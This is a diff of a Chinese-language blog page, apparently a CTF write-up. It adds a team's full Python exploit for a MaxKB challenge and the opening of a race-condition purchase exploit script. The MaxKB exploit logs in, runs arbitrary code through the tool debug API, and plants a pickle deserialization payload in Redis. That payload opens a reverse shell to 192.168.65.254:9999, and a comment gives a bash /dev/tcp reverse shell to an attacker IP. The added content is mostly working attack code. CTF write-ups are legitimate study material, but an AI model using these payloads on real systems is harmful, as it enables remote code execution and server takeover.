@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">5.5k字</span>
+        <span class="post-count">7.4k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">28分</span>
+        <span class="post-count">40分</span>
       </span>
     </span>
     
@@ -857,6 +857,243 @@ CELERY_accept_content <span class="token operator">=</span> <span class="token p
 <p>redis 的密码是默认的 Password123@redis ，那么我们就可以通过与 redis 的交互打 Celery 的 pickle 反序列化</p>
 <p>vulhub 上有一个 celery3 未授权打 pickle 的 exp： <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py">https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py</a></p>
 <p>题目版本是 celery 5.5.3</p>
+<p>SU 的 exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token triple-quoted-string string">"""
+MaxKB RCE Exploit - Complete Attack Chain
+增加：远程写文件功能 write_remote_file()
+增加：Redis Pickle 注入功能 inject_pickle_payload()
+修正：修复了所有 'return' outside function 的语法错误
+"""</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> textwrap
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> subprocess
+<span class="token comment"># Target configuration</span>
+TARGET_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28080"</span>
+USERNAME <span class="token operator">=</span> <span class="token string">"admin"</span>
+PASSWORD <span class="token operator">=</span> <span class="token string">"MaxKB@123.."</span>
+
+<span class="token comment"># API endpoints</span>
+API_BASE <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api"</span></span>
+TOOL_DEBUG_API <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/workspace/default/tool/debug"</span></span>
+
+<span class="token comment"># Session setup</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span><span class="token punctuation">,</span>
+    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
+    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Login to MaxKB and get JWT token.
+    Returns the token string on success, None on failure.
+    """</span>
+    login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"username"</span><span class="token punctuation">:</span> USERNAME<span class="token punctuation">,</span>
+        <span class="token string">"encryptedData"</span><span class="token punctuation">:</span> <span class="token string">"VQLS7jsDK8kKlSccMNTZkXc1+CK2NzISGlSr7p8RMkAN5lJXcFoou9KrOl5luQoN7qQ+RRmt9nW4pBFLUobyD0EC8ZlyHWJSxDONebYZUg4/ycb/0L1H0l3D5KttE1hdekUUFSA3TCNyTKpdykGxau8VzSd7JLNm04lJc+pmQ64aI9dj7AN5OpbYNvHJlVWUNl7v1fGK4ty1goAlpaxm9g05uxTCx+pSyQz1cayZ21o6qP/hsLVI9vTpKyVsp3qVKD6p4m/vk0XWgxfX1D94dzyJGrpjKLxiSypnG66zgwqBDroqMIVSa2X43og3qcxr43k380kT/loCAQVBz0qRbA=="</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#125;</span>
+    login_api <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/user/login"</span></span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_api<span class="token punctuation">,</span> json<span class="token operator">=</span>login_data<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'data'</span> <span class="token keyword">in</span> result <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token string">'token'</span> <span class="token keyword">in</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                token <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
+                session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'AUTHORIZATION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Login successful!"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] JWT Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">50]</span><span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> token
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">None</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login request failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+
+<span class="token keyword">def</span> <span class="token function">execute_python_code</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Execute Python code through tool debug endpoint"""</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
+        <span class="token string">"input_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"init_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"init_params"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token string">"debug_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>TOOL_DEBUG_API<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token comment"># print(result) # Uncomment for deep debugging</span>
+            <span class="token keyword">if</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Server-side error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'No data returned'</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"HTTP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Exception: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+<span class="token comment"># ======================================</span>
+<span class="token comment"># ========= 新增：Pickle注入功能 =========</span>
+<span class="token comment"># ======================================</span>
+<span class="token keyword">class</span> <span class="token class-name">PickleRCE</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>command <span class="token operator">=</span> command
+
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 返回一个可调用对象和其参数</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.65.254",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">inject_pickle_payload</span><span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Generates a pickle payload and injects it into Redis via the RCE vulnerability.
+    """</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Crafting pickle payload to execute command: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>
+    
+    pickle_payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>PickleRCE<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    b64_payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle_payload<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
+    redis_key <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f":TOKEN:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Target Redis key will be: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    remote_code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+def set_pickle_in_redis():
+    import redis
+    import base64
+    
+    try:
+        r = redis.Redis(host=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_host<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, port=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_port<span class="token punctuation">&#125;</span></span><span class="token string">, password=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_password<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, db=0)
+        redis_key = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">
+        b64_payload = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b64_payload<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">
+        pickle_data = base64.b64decode(b64_payload)
+        r.set(redis_key, pickle_data)
+        return f"OK: Successfully wrote &#123;&#123;len(pickle_data)&#125;&#125; bytes of pickle data to key '&#123;&#123;redis_key&#125;&#125;'."
+    except Exception as e:
+        return f"Redis Error: &#123;&#123;e&#125;&#125;"
+
+set_pickle_in_redis() # &lt;-- FIX: Removed 'return' from here
+"""</span></span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending payload to remote server to inject into Redis..."</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>remote_code<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">execute_system_command</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Execute system command using a robust method."""</span>
+    <span class="token comment"># Using subprocess is generally better than os.system for capturing output</span>
+    code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+def run_cmd():
+    import subprocess
+    import shlex
+    
+    command = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">
+    try:
+        # Use shlex.split for better argument handling
+        args = shlex.split(command)
+        result = subprocess.run(args, capture_output=True, text=True, timeout=10)
+        
+        output = result.stdout if result.stdout else ""
+        error = result.stderr if result.stderr else ""
+        
+        if output or error:
+            return f"STDOUT:\\n&#123;&#123;output&#125;&#125;\\nSTDERR:\\n&#123;&#123;error&#125;&#125;"
+        else:
+            return "Command executed with no output."
+            
+    except FileNotFoundError:
+        return f"Error: Command not found or path does not exist."
+    except Exception as e:
+        return f"Command execution failed: &#123;&#123;e&#125;&#125;"
+
+run_cmd() # &lt;-- FIX: Removed 'return' from here
+"""</span></span>
+    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Main exploitation function"""</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MaxKB RCE Exploit - Complete Attack Chain"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Target: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Step 1: Login</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 1: Authentication"</span><span class="token punctuation">)</span>
+    token <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Exploit failed - cannot login"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+        
+    <span class="token comment"># Optional Step: Test basic code execution</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Testing basic code execution..."</span><span class="token punctuation">)</span>
+    test_code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+def test():
+    return "RCE confirmed - Code execution successful!"
+test()
+"""</span> <span class="token comment"># &lt;-- FIX: Removed 'return' from here too</span>
+    result <span class="token operator">=</span> execute_python_code<span class="token punctuation">(</span>test_code<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"RCE confirmed"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Basic RCE test failed. Aborting."</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># ==========================================================</span>
+    <span class="token comment"># ========= 核心利用步骤：注入Pickle Payload到Redis =========</span>
+    <span class="token comment"># ==========================================================</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 2: Injecting Pickle Payload into Redis for RCE"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Configure Redis connection info</span>
+    redis_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
+    redis_port <span class="token operator">=</span> <span class="token number">6379</span>
+    redis_password <span class="token operator">=</span> <span class="token string">"Password123@redis"</span>
+
+    <span class="token comment"># Define the command you want to execute on the target server</span>
+    <span class="token comment"># command_to_execute = "bash -c 'bash -i >&amp; /dev/tcp/YOUR_ATTACKER_IP/YOUR_PORT 0>&amp;1'"</span>
+    <span class="token comment"># Or for a simple test:</span>
+    command_to_execute <span class="token operator">=</span> <span class="token string">"touch /tmp/pwned_by_pickle"</span>
+    
+    <span class="token comment"># Call the injection function</span>
+    result <span class="token operator">=</span> inject_pickle_payload<span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command_to_execute<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Injection Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token string">"OK:"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Pickle payload injected successfully!"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] The next time the application deserializes this token from Redis,"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] the command '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command_to_execute<span class="token punctuation">&#125;</span></span><span class="token string">' should be executed on the server."</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] You may need to trigger this by making another authenticated request or simply waiting."</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] If using a reverse shell, make sure your listener (e.g., 'nc -lvnp YOUR_PORT') is running."</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Failed to inject pickle payload."</span><span class="token punctuation">)</span>
+        
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] You can now try to verify if the command was executed (if you used a non-interactive command)."</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] For example, checking if the file '/tmp/pwned_by_pickle' exists:"</span><span class="token punctuation">)</span>
+    
+    verification_result <span class="token operator">=</span> execute_system_command<span class="token punctuation">(</span><span class="token string">"ls -l /tmp/pwned_by_pickle"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Verification Result]\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>verification_result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] EXPLOIT FINISHED"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <h2 id="解法三：SSRF-to-RCE"><a href="#解法三：SSRF-to-RCE" class="headerlink" title="解法三：SSRF to RCE"></a>解法三：SSRF to RCE</h2><hr>
 <h1 id="UltimateFreeloader（复现）"><a href="#UltimateFreeloader（复现）" class="headerlink" title="UltimateFreeloader（复现）"></a>UltimateFreeloader（复现）</h1><p>审计源码</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>
@@ -1079,6 +1316,239 @@ CELERY_accept_content <span class="token operator">=</span> <span class="token p
 </tr>
 </tbody></table>
 <p>从而实现不花钱不使用优惠券但是能够购入商品，相同的思路分别对4种商品进行竞争</p>
+<p>这里直接放 SU 的 exp 了：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> time
+<span class="token keyword">from</span> decimal <span class="token keyword">import</span> Decimal
+
+<span class="token keyword">import</span> requests
+
+BASE_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28086"</span>
+<span class="token comment"># BASE_URL = "http://61.147.171.35:51469"</span>
+
+TARGET_PRODUCTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Little Potato"</span><span class="token punctuation">,</span> <span class="token string">"Sweet Potato"</span><span class="token punctuation">,</span> <span class="token string">"Fish Fish"</span><span class="token punctuation">,</span> <span class="token string">"Large Potato"</span><span class="token punctuation">]</span>
+BASE_PRODUCT_NAME <span class="token operator">=</span> <span class="token string">"Little Potato"</span>
+
+SESSION <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">api_request</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> path<span class="token punctuation">,</span> token<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> path
+    headers <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"headers"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
+        headers<span class="token punctuation">[</span><span class="token string">"Authorization"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token keyword">if</span> <span class="token string">"json"</span> <span class="token keyword">in</span> kwargs <span class="token keyword">and</span> <span class="token string">"Content-Type"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> headers<span class="token punctuation">:</span>
+        headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"application/json"</span>
+
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            resp <span class="token operator">=</span> SESSION<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
